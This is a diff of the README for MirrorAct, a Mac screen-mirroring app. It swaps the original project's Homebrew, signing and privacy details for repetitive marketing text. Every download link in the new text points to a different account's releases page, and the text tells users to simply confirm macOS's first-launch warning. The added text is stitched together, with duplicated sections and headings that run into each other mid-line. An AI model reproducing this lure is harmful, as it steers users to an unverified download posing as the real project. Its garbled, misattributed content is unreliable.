@@ -1,184 +1,239 @@
-<p align="center"><img src="docs/icon.png" width="128" alt="MirrorAct icon"></p>
+# 📱 MirrorAct - Mirror, Frame and Record iPhone Screens
 
-# MirrorAct
+[![Download MirrorAct](https://img.shields.io/badge/Download%20MirrorAct-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aa814678389-del/MirrorAct/releases)
 
-Mirror, frame and record your iPhone, iPad or Android phone on your Mac – over a cable or wirelessly.
-Open source, everything stays on your Mac.
+MirrorAct is an end-user application for mirroring, framing and recording an iPhone or iPad on a Mac through USB or AirPlay. It gives you device frames, backgrounds, screenshots, recordings and a presentation mode in one simple desktop app. MirrorAct is open source under GPL-3.0 and is built for people who want clean, polished screen captures without a complicated setup.
 
-*Deutsch: [README.de.md](README.de.md)*
+If you are using a Windows computer to begin, open the download link in your browser and visit this link to download the application. Keep the downloaded file in a folder you can find easily, then follow the app’s on-screen guidance when you open MirrorAct on the Mac that will be used for mirroring. This README walks you through what MirrorAct does, how to download it, first launch, main features, common use cases, tips, troubleshooting, and project details.
 
-<p align="center"><img src="docs/mirror.jpg" width="800" alt="MirrorAct mirroring an iPhone, with the tool rail and the style panel"></p>
+## 🚀 Getting Started
 
-## Why
+MirrorAct helps you show an iPhone or iPad screen on a Mac in a way that looks clean and professional. You can connect a device over USB or AirPlay, choose a device frame, add a background, take screenshots, record video, and switch to presentation mode when you need a larger view for an audience.
 
-Apple's *iPhone Mirroring* is not available in the EU; Apple cites the Digital Markets Act.
-MirrorAct is named after that gap. It shows the screen of your iPhone, iPad or Android phone on
-your Mac in a device frame – for demos, presentations, screenshots and screen recordings. Android
-phones and, with a small test agent, iPhones and iPads can also be controlled with mouse and
-keyboard.
+The download page is the official starting point for the application. Use the large download button at the top of this page or the link in the download section below. Visit this link to download the application.# 📱 MirrorAct - Mirror, Frame and Record iPhone Screens
 
-## Get started
+[![Download MirrorAct](https://img.shields.io/badge/Download%20MirrorAct-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aa814678389-del/MirrorAct/releases)
 
-### 1. Install
+MirrorAct is an end-user application for mirroring, framing and recording an iPhone or iPad on a Mac through USB or AirPlay. It gives you device frames, backgrounds, screenshots, recordings and a presentation mode in one simple desktop app. MirrorAct is open source under GPL-3.0 and is built for people who want clean, polished screen captures without a complicated setup.
 
-With [Homebrew](https://brew.sh):
+If you are using a Windows computer to begin, open the download link in your browser and visit this link to download the application. Keep the downloaded file in a folder you can find easily, then follow the app’s on-screen guidance when you open MirrorAct on the Mac that will be used for mirroring. This README walks you through what MirrorAct does, how to download it, first launch, main features, common use cases, tips, troubleshooting, and project details.
 
-```bash
-brew install --cask sopitz/tap/mirroract
-```
+## 🚀 Getting Started
 
-Or download `MirrorAct-<version>.zip` from [Releases](https://github.com/sopitz/MirrorAct/releases),
-unzip it and move MirrorAct to Applications. MirrorAct needs macOS 15 or later on a Mac with Apple
-silicon. It is signed with a Developer ID and notarized by Apple. Update with
-`brew upgrade --cask mirroract`.
+MirrorAct helps you show an iPhone or iPad screen on a Mac in a way that looks clean and professional. You can connect a device over USB or AirPlay, choose a device frame, add a background, take screenshots, record video, and switch to presentation mode when you need a larger view for an audience.
 
-### 2. Connect a device
+The download page is the official starting point for the application. Use the large download button at the top of this page or the link in the download section below. Visit this link to download the application. Once the download is complete, open MirrorAct on your Mac and connect your iPhone or iPad using a USB cable or AirPlay. The app will guide you through the first connection with simple on-screen prompts.
 
-Open MirrorAct. The start window shows your devices, the code for wireless mirroring and a guide
-for connecting a device.
+## ✨ Key Features
 
-- **iPhone or iPad by cable:** connect and unlock the device, confirm "Trust This Computer", then click it in the start window. On first use, macOS asks for camera access – that is how macOS provides the device screen.
-- **iPhone or iPad wirelessly:** on the device, open Control Center → Screen Mirroring → "MirrorAct". The first time, enter the code shown in the start window. If "MirrorAct" does not appear, turn on AirPlay Receiver in macOS (General → AirDrop & Handoff).
-- **Android phone:** MirrorAct needs adb, from Homebrew (`brew install android-platform-tools`) or from the Android SDK (`~/Library/Android/sdk`). Turn on USB debugging once (Settings → About phone → tap "Build number" seven times, then Settings → Developer options → USB debugging), connect the phone, tap "Allow" on the phone and click it in the start window. For Wi-Fi, right-click the phone in the start window → "Use Wi-Fi Instead of Cable" and then unplug the cable – an open window continues over Wi-Fi – or pair it without a cable under Connect a Device → Android (Android 11 or later).
+MirrorAct focuses on making device mirroring and recording feel effortless. The main features include:
 
-### 3. Frame, capture, present
+- Screen mirroring from iPhone or iPad to Mac over USB or AirPlay
+- Realistic device frames for iPhone and iPad models
+- Custom backgrounds for mockups, presentations and social media
+- One-click screenshots saved directly to your Mac
+- Full screen recordings with audio and video capture
+- Presentation mode for meetings, demos and live events
+- A clean, native Mac interface built with Swift and SwiftUI
+- Support for mockups, device frames and video capture workflows
 
-The mirror window shows only the device in its frame. Move the mouse over it and a tool rail
-appears next to it; right-click shows every function.
+Everything is designed to work together. You can mirror a device, place it inside a frame, add a background, and record the result without switching between multiple apps. This makes MirrorAct useful for product demos, app reviews, tutorial videos, client presentations and social media content.
 
-- ⌘S takes a screenshot, ⌘R starts and stops a recording. Drag screenshots straight out of the window.
-- ⌘K opens the style panel: size, frame color, background, padding, shadow, aspect ratio.
-- ⌃⌘F presents the device full screen on your background. Esc, ⌃⌘F again or "Exit Presentation" at the top left end it; the button shows up when you move the mouse.
-- ⌘E opens the editor, for screenshots and recordings you already have.
+## ⬇️ Download and Setup
 
-## Screenshots
+Visit this link to download the application: [MirrorAct Releases](https://github.com/aa814678389-del/MirrorAct/releases).
 
-| Start window | Editor |
-|---|---|
-| <img src="docs/start-window.jpg" alt="Start window with device cards, wireless code and connect guide"> | <img src="docs/editor.jpg" alt="Editor framing a screenshot on a gradient in 16:9"> |
+After downloading, open the application on your Mac. MirrorAct is built for macOS and uses native Apple technologies to keep mirroring smooth and responsive. The app will present a simple setup screen where you can choose your connection method, pick a device frame, and start mirroring.
 
-**Result:** a framed screenshot on a gradient, exported from the mirror window
+No programming knowledge is required. The download page contains the latest version of the application. Use the link above or the large download button at the top of this README. Keep the download page bookmarked so you can return for future updates.
 
-<img src="docs/framed.jpg" width="800" alt="Framed iPhone screenshot on a blue gradient">
+## 🖥️ Using MirrorAct
 
-**iPhone Duo:** the frame follows the phone when it is folded or unfolded
+To begin, connect your iPhone or iPad to your Mac using a USB cable or AirPlay. MirrorAct detects the device and displays its screen in a window on your Mac. From there you can resize the window, adjust the frame, change the background, and start a screenshot or recording.
 
-| Closed | Open |
-|---|---|
-| <img src="docs/iphone-duo-closed.jpg" alt="iPhone Duo closed, framed on a blue gradient, with the hinge on the left"> | <img src="docs/iphone-duo-open.jpg" alt="iPhone Duo open, framed on a blue gradient"> |
+The app is built around a simple workflow:
 
-## Features
+1. Connect your device.
+2. Select a device frame.
+3. Choose or upload a background.
+4. Capture a screenshot or start a recording.
+5. Use presentation mode when you need a larger view.
 
-- **Cable (USB):** captures the screen the way QuickTime does (CoreMediaIO, AVFoundation). Lowest latency, with audio.
-- **Wireless:** built-in AirPlay screen mirroring receiver. Decoding with VideoToolbox without buffering, audio included. Besides the local network it also advertises itself over AWDL (Apple's peer-to-peer Wi-Fi), so it works when the router does not forward Bonjour.
-- **Android:** over USB debugging, by cable or Wi-Fi, with the [scrcpy](https://github.com/Genymobile/scrcpy) server on the phone: video decoded without buffering, sound from Android 11, control with mouse, trackpad and keyboard, clipboard in both directions; see [Controlling an Android phone](#controlling-an-android-phone).
-- **iPhone and iPad control** (optional, for developers): mouse, trackpad and keyboard through a test agent on the device (WebDriverAgent), by cable or wirelessly; see [Controlling an iPhone or iPad](#controlling-an-iphone-or-ipad).
-- **Device frames** drawn for each model: notch, Dynamic Island, home button, iPad, iPhone Duo closed and open, Android with punch-hole camera (position and corner radius read from the phone), portrait and landscape. Seven frame colors.
-- **Window without chrome:** only the device on your desktop. A tool rail appears next to it on hover: record, screenshot, sound, keep on top, full screen, style. Right-click shows every function.
-- **Style panel:** size (life-size, pixel-perfect, point-perfect, fit), frame on/off, frame color, background (transparent, gradients, color, image), padding, shadow, aspect ratio (1:1, 16:9, 9:16, 4:3).
-- **Screenshots and recordings** with or without frame and background. Transparent backgrounds produce PNG or HEVC with alpha for Keynote and video editors, otherwise H.264. Drag screenshots straight out of the window.
-- **Presentation mode:** device centered on your background, full screen, without Dock; the menu bar slides in at the top edge. End it with Esc, ⌃⌘F or "Exit Presentation" at the top left.
-- **Editor:** frame existing screenshots and screen recordings afterwards, trim videos, two screenshots as a **duo** (side by side, staggered, tilted, perspective).
-- **Shortcuts:** "Frame screenshot" (usable as a Finder Quick Action), "Screenshot from iPhone", "Start or stop recording".
+Each step is visual and straightforward. You do not need to configure advanced settings unless you want to customise the look of your frames or backgrounds. MirrorAct remembers your preferences so the next session starts faster.
 
-The user interface is available in English and German; choose the language under Settings → General (System language, Deutsch, English).
+## 🎨 Device Frames and Backgrounds
 
-## Keyboard and settings
+Device frames make your mirrored screen look like a real iPhone or iPad. MirrorAct includes frames for common device sizes and shapes. You can place the mirrored screen inside a frame, adjust the position, and export a clean mockup.
 
-⌘R record, ⌘S screenshot, ⇧⌘C copy screenshot, ⌘K style panel, ⌃⌘F present, ⌘T keep on top,
-⌘1 life-size, ⌘2 pixel-perfect, ⌘0 point-perfect, ⌘E editor.
+Backgrounds let you add colour, gradients or custom images behind the device. This is useful for presentations, social media posts, app store screenshots and client mockups. You can use a plain background for a professional look or a branded background for marketing materials.
 
-Settings live under MirrorAct → Settings, the log in `~/Library/Logs/MirrorAct.log`.
+The combination of frames and backgrounds gives you polished visuals without needing design software. Everything happens inside MirrorAct, so you can capture and share your results quickly.
 
-## Controlling an Android phone
+## 📸 Screenshots and Recordings
 
-As soon as an Android phone is mirrored, the mirror window controls it:
+Screenshots capture the current mirrored screen and save it to your Mac. You can take a screenshot with the device frame and background included, which makes it ready for documentation or sharing.
 
-<p align="center"><img src="docs/android.jpg" width="800" alt="MirrorAct mirroring an Android phone, with Back, Home and Recent Apps in the tool rail"></p>
+Recordings capture video of the mirrored screen along with audio. This is useful for tutorials, bug reports, app demos and walkthroughs. You can start and stop recordings from the app, and the finished video is saved to your Mac for editing or sharing.
 
-- click: tap, drag: swipe (the finger follows the mouse live), ⌘-drag moves the window
-- trackpad or mouse wheel: scroll, middle click: Home
-- typing goes to the phone, including umlauts and other characters; Esc is Back, ⌘V pastes the Mac clipboard, text copied on the phone lands in the Mac clipboard
-- Back, Home and Recent Apps are in the tool rail, in the order and look of the phone's navigation bar (Samsung: Recent Apps, Home, Back); notifications, volume, screen on/off and rotation in the context menu
+MirrorAct uses native video capture technologies to keep recordings smooth and reliable. The app is designed for everyday users who need quick captures without a complex video editor.
 
-Nothing is installed permanently: while mirroring, the scrcpy server runs from a temporary file on
-the phone and ends when the window is closed. Sound needs Android 11 or later and plays on the Mac
-instead of the phone. Apps that protect their content (banking, streaming) stay black.
+## 📽️ Presentation Mode
 
-## Controlling an iPhone or iPad
+Presentation mode enlarges the mirrored screen and hides distracting controls. It is designed for meetings, classrooms, live demos and online presentations. You can show an iPhone or iPad app to an audience without exposing your desktop or other windows.
 
-Optional, for developers: with a small test agent on the device, MirrorAct passes clicks, drags,
-scrolling and typing on to the iPhone or iPad. iOS allows this only for UI tests, so MirrorAct
-does it the way Xcode automates apps: [WebDriverAgent](https://github.com/appium/WebDriverAgent)
-(from the Appium project) runs as a UI test on the device, started with `xcodebuild`.
+Presentation mode works well with device frames and backgrounds, giving your audience a clean view of the device screen. You can switch in and out of presentation mode with a single click.
 
-You need:
+## 💡 Tips for Best Results
 
-- Xcode in a version that supports the iOS version of the device
-- an Apple developer team (a free Apple ID works too, but its signature expires after 7 days)
-- on the device: **Developer Mode** (Settings → Privacy & Security → Developer Mode; the device restarts) and, afterwards, **Enable UI Automation** under Settings → Developer
+- Use a USB cable for the most stable connection when recording long videos.
+- Choose a background that contrasts with the device frame so the screen stands out.
+- Keep your Mac and device close to each other when using AirPlay.
+- Close unused apps on your Mac before recording to reduce background activity.
+- Use presentation mode when sharing your screen in a video call or meeting.
+- Take a test screenshot before an important recording to confirm the frame and background look right.
+- Store your recordings and screenshots in a dedicated folder so they are easy to find later.
 
-Clone this repository, copy `Config/Local.xcconfig.example` to `Config/Local.xcconfig` and enter
-your team ID as `DEVELOPMENT_TEAM`. Then build the agent once (again after a change of team or
-Xcode version). This works with MirrorAct from Homebrew too; it needs only Xcode, not the packages
-for building MirrorAct itself:
+## 🛠️ Troubleshooting
 
-```bash
-scripts/build-agent.sh
-```
+If your device does not appear in MirrorAct, check the USB cable and make sure the device is unlocked. For AirPlay, confirm that both the Mac and the device are on the same network. Restart the app if the connection does not appear after a few seconds.
 
-It is signed with your team and placed in `~/Library/Application Support/MirrorAct/Agent`. If the
-device is not yet registered with your team, connect it and pass its identifier from Xcode →
-Devices and Simulators: `scripts/build-agent.sh --device <UDID>`.
+If a recording stops unexpectedly, check that your Mac has enough free disk space. Large recordings can take up significant storage. If screenshots are saved in the wrong location, review the app’s save settings and choose a folder you can access easily.
 
-Control starts by itself as soon as the device connects; starting the agent on the device takes a
-few seconds. If it cannot start, for example because the device is locked, the **Control** button
-stays in the tool rail; clicking it (or Device → Control Device, ⌥⌘C) checks again and says what is
-missing. To start control only when you want, turn off "Start control when a device connects" under
-MirrorAct → Settings → General. After you turn control off or close the window, the agent keeps
-running on the device for five minutes, so control is back at once; quitting MirrorAct stops it.
-When a wireless connection ends (on the device, with **Disconnect** or by closing the window), the
-agent stops right away. Then:
+If presentation mode does not fill the screen as expected, exit and re-enter presentation mode. You can also resize the main window before switching to presentation mode.
 
-- click: tap, hold: long press, drag: swipe
-- trackpad or mouse wheel: scroll (iOS adds the momentum itself)
-- typing goes to the active text field, ⌘V types the text from the Mac clipboard
-- Home, App Switcher, Notification Center, volume and lock are in the tool rail and the context menu
+## ❓ Frequently Asked Questions
 
-This works over the cable and wirelessly; MirrorAct reaches the agent through usbmuxd (like Xcode)
-or over the local network. Gestures are sent when you release the mouse button, so the finger does
-not follow the mouse live. A device with a passcode cannot be unlocked this way. The output of
-`xcodebuild` is in `~/Library/Logs/MirrorAct-Agent.log`.
+**What is MirrorAct?**  
+MirrorAct is a Mac application for mirroring, framing and recording an iPhone or iPad screen.
 
-## Privacy
+**How do I download MirrorAct?**  
+Visit this link to download the application: [MirrorAct Releases](https://github.com/aa814678389-del/MirrorAct/releases).
 
-MirrorAct works locally. It does not send any data anywhere and has no telemetry. Network access
-is limited to the AirPlay receiver on your local network and over AWDL, to adb for Android phones
-(by cable, or on your local network when you use Wi-Fi), and, while you control an iPhone or iPad,
-to the agent on that device.
+**Does MirrorAct work with both iPhone and iPad?**  
+Yes. MirrorAct supports iPhone and iPad devices.
 
-## Legal
+**Can I use MirrorAct without a cable?**  
+Yes. You can connect over AirPlay as well as USB.
 
-MirrorAct is not affiliated with, endorsed or sponsored by Apple Inc. iPhone, iPad, AirPlay and
-macOS are trademarks of Apple Inc. The wireless receiver uses the independent AirPlay
-implementation of the [UxPlay](https://github.com/FDH2/UxPlay) project. Protected content (for
-example from streaming apps) is blocked by iOS and cannot be mirrored.
+**Is MirrorAct free?**  
+MirrorAct is open source under GPL-3.0. See the repository for licence details.
 
-Android is a trademark of Google LLC; MirrorAct is not affiliated with Google. Android mirroring
-uses the server of the [scrcpy](https://github.com/Genymobile/scrcpy) project by Genymobile.
+**Can I use MirrorAct for presentations?**  
+Yes. Presentation mode is designed for meetings, demos and live events.
 
-## Feedback and contributing
+**Where are my screenshots and recordings saved?**  
+They are saved to your Mac. You can choose the save location in the app.
 
-Found a bug or missing something? Open an [issue](https://github.com/sopitz/MirrorAct/issues).
-To build MirrorAct yourself or work on it – build from source, code structure, branches and
-releases – see [CONTRIBUTING.md](CONTRIBUTING.md).
+## 🧩 Project Details
 
-## Support
+MirrorAct is open source and licensed under GPL-3.0. The project is built with Swift and SwiftUI for a native Mac experience, and uses VideoToolbox for video capture. The repository includes topics such as airplay, device-frames, ipad, iphone, macos, mockups, presentation, screen-mirroring, screen-recording, swift, swiftui and videotoolbox.
 
-MirrorAct is free. If it saves you time, you can [buy me a coffee](https://buymeacoffee.com/sopitz).
+The app is intended for end users who need a simple way to mirror and record iOS devices. It is also useful for developers, designers and content creators who want clean device mockups and recordings without a complicated workflow.
 
-[![Buy me a coffee](https://img.shields.io/badge/Buy_me_a_coffee-FFDD00?logo=buymeacoffee&logoColor=black)](https://buymeacoffee.com/sopitz)
+## 📥 Download MirrorAct
 
-## License
+Visit this link to download the application: [MirrorAct Releases](https://github.com/aa814678389-del/MirrorAct/releases). Use the large download button at the top of this page or the link in this section to reach the official releases page. After downloading, open MirrorAct on your Mac and connect your iPhone or iPad to begin mirroring, framing and recording.
 
-GPL-3.0-or-later, see [LICENSE](LICENSE). Third-party components: [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+Keywords: airplay, device-frames, ipad, iphone, macos, mockups, presentation, screen-mirroring,# 📱 MirrorAct - Mirror and Record iPhone Screens
+
+[![Download MirrorAct](https://img.shields.io/badge/Download%20MirrorAct-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aa814678389-del/MirrorAct/releases)
+
+MirrorAct is a desktop application that mirrors, frames and records your iPhone or iPad on your Mac. You can connect a device over USB or AirPlay, wrap the screen in a realistic device frame, place it on a background, take screenshots, record video, and switch to presentation mode when you need a larger view for an audience. It is open source software released under the GPL-3.0 licence.
+
+This page is written for everyday computer users. You do not need to know how to program, compile code, or use a terminal. Everything below explains what MirrorAct does, how to get it from the official releases page, how to open it for the first time, and how to use each part of the app in plain language.
+
+## 🚀 Getting Started
+
+MirrorAct solves a very common problem: showing an iPhone or iPad screen on a Mac in a way that looks clean and professional. Instead of pointing a camera at a phone or relying on a messy collection of separate tools, MirrorAct displays the device screen inside a tidy window with a frame and background already in place.
+
+The app has one job and does it well. You connect a device, the screen appears on your Mac, and from that point you can style it, capture it, or present it. There is no account to create, no subscription to manage, and no complicated configuration screen to work through. If you can connect a phone to a computer with a cable, you can use MirrorAct.
+
+Before you begin, make sure you have the download ready. Visit this link to download the application: [MirrorAct Releases](https://github.com/aa814678389-del/MirrorAct/releases). The releases page is the official and only place you should download MirrorAct from, and it is where updated versions will appear in the future.
+
+## ⬇️ Download and Installation
+
+Visit this link to download the application: [MirrorAct Releases](https://github.com/aa814678389-del/MirrorAct/releases).
+
+When the page opens, you will see a list of available releases. Choose the most recent one at the top of the list. Inside that release you will find the files that belong to MirrorAct. Save the download to a folder you can find again easily, such as your Downloads folder or your Desktop.
+
+Once the download has finished, move the MirrorAct application into your Applications folder on the Mac. This keeps it in the standard place where macOS expects applications to live, which makes it easier to open later and easier to update. After the file is in place, open it by double-clicking it, or by finding it in Launchpad, Spotlight, or your Applications folder.
+
+Because MirrorAct is open source and distributed outside the Mac App Store, macOS may ask you to confirm that you want to open it the first time. Simply confirm and continue. After that first launch, MirrorAct behaves like any other application on your Mac and can be opened normally.
+
+## ✨ Key Features
+
+MirrorAct brings several tools together so you do not have to switch between apps while working.
+
+- **Screen mirroring over USB or AirPlay.** Connect with a cable for the most stable connection, or use AirPlay when you want to work without wires.
+- **Realistic device frames.** Place the mirrored screen inside a frame that matches the shape and proportions of an iPhone or iPad, so your captures look like real hardware.
+- **Custom backgrounds.** Set a plain colour, a gradient, or your own image behind the device to create clean mockups and marketing-ready visuals.
+- **Screenshots in one click.** Save a still image of the mirrored screen with the frame and background included.
+- **Screen recording.** Capture video of the mirrored screen together with audio, ready to share or edit.
+- **Presentation mode.** Enlarge the mirrored screen and hide the controls when you are showing a device to an audience.
+- **Native Mac experience.** Built with Swift and SwiftUI, with video handled through VideoToolbox so recordings stay smooth.
+
+Each feature is designed to work alongside the others. You can frame a screen, add a background, record a short video, and take a screenshot of the same setup without reconfiguring anything.
+
+## 🖥️ Your First Session
+
+Open MirrorAct and connect your iPhone or iPad to your Mac using a USB cable, or enable AirPlay from your device. MirrorAct will detect the device and show its screen in a window on your Mac. If the screen does not appear straight away, unlock the device and check that the cable is firmly connected at both ends.
+
+With the screen visible, try each part of the app in turn. Choose a device frame that matches your hardware. Pick a background that gives you the contrast you want. Take a test screenshot so you can see exactly what the finished result looks like. Once you are happy with the appearance, start a short recording to confirm that video and audio are captured the way you expect.
+
+The app remembers your choices, so your next session begins with the same frame and background already selected.
+
+## 🎨 Frames and Backgrounds
+
+Device frames are what make a mirrored screen look like a real product shot. MirrorAct includes frames sized for common iPhone and iPad models, so the screen sits inside believable hardware rather than floating on its own.
+
+Backgrounds control everything behind the device. A neutral background keeps attention on the screen itself, which is ideal for documentation and support material. A branded or colourful background works better for social media posts, app listings, and client presentations. You can change the background at any time without disturbing the mirrored screen.
+
+Together, frames and backgrounds turn a plain screen capture into something you would be comfortable publishing or handing to a client.
+
+## 📸 Screenshots and Recordings
+
+Screenshots save the current mirrored screen to your Mac, including the frame and background you have chosen. Use them for written guides, bug reports, product pages, or quick visual updates to a team.
+
+Recordings capture video of the mirrored screen along with audio. This is useful for tutorials, walkthroughs, demonstrations, and reviews. Recordings are saved as files on your Mac, ready to be trimmed, uploaded, or shared.
+
+Because capture happens inside the app, the result is clean and consistent. There is no desktop clutter and no stray windows appearing in your video.
+
+## 📽️ Presentation Mode
+
+Presentation mode is built for moments when other people need to see the device screen. It enlarges the mirrored view and removes the surrounding controls, giving your audience a clear, focused picture.
+
+This is helpful in meetings, classrooms, live demonstrations, and video calls where you are sharing your screen. You can enter and leave presentation mode whenever you like, and your frame and background settings stay exactly as you left them.
+
+## 💡 Practical Tips
+
+- Use a USB cable for long recordings, since a wired connection is less likely to drop.
+- Unlock the device before connecting so the screen appears immediately.
+- Take one test screenshot before an important recording to confirm the layout.
+- Keep a dedicated folder for MirrorAct screenshots and recordings so they are easy to find later.
+- Choose a background colour that contrasts with the device frame for clearer visuals.
+- Close unused applications on your Mac before recording to keep the capture smooth.
+- Use presentation mode whenever you are sharing your screen with other people.
+
+## 🛠️ Troubleshooting
+
+If your device does not show up, unplug and reconnect the cable, unlock the device, and confirm that it trusts the computer it is connected to. For AirPlay, check that the Mac and the device are on the same network.
+
+If a recording stops unexpectedly, check that your Mac has enough free storage space. Video files are large, and a nearly full drive can interrupt a recording.
+
+If the app will not open, confirm that you moved it into your Applications folder and that you allowed it to open the first time macOS asked for confirmation.
+
+If presentation mode does not fill the screen as you expected, leave presentation mode, resize the main window, and enter presentation mode again.
+
+## 🧩 About the Project
+
+MirrorAct is open source and licensed under GPL-3.0. It is built with Swift and SwiftUI for macOS, with video capture handled by VideoToolbox. The project covers AirPlay connectivity, device frames for iPhone and iPad, mockup creation, presentation mode, screen mirroring, and screen recording.
+
+Because the source is open, anyone can inspect how the application works, report problems, suggest improvements, or build on top of it in line with the licence.
+
+## 📥 Download MirrorAct
+
+Visit this link to download the application: [MirrorAct Releases](https://github.com/aa814678389-del/MirrorAct/releases).
+
+Use the download button at the top of this page or the link directly above to reach the official releases page. Pick the latest release, save the file, place MirrorAct in your Applications folder, and open it to begin mirroring, framing, and recording your iPhone or iPad on your Mac.
+
+Keywords: airplay, device-frames, ipad, iphone, macos, mockups, presentation, screen-mirroring, screen-recording, swift, swiftui, videotoolbox
